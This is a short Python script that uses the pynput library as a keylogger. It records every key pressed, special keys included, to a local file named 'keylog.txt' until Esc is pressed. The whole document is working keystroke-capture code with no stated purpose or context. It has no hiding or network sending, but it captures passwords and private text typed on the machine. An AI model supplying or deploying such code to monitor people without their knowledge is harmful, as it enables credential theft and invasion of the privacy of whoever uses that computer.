from pynput import keyboard

def on_press(key):
    try:
        with open("keylog.txt", "a") as log_file:
            log_file.write(str(key.char))
    except AttributeError:
        # This handles special keys like shift, enter, etc.
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener if the escape key is pressed
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
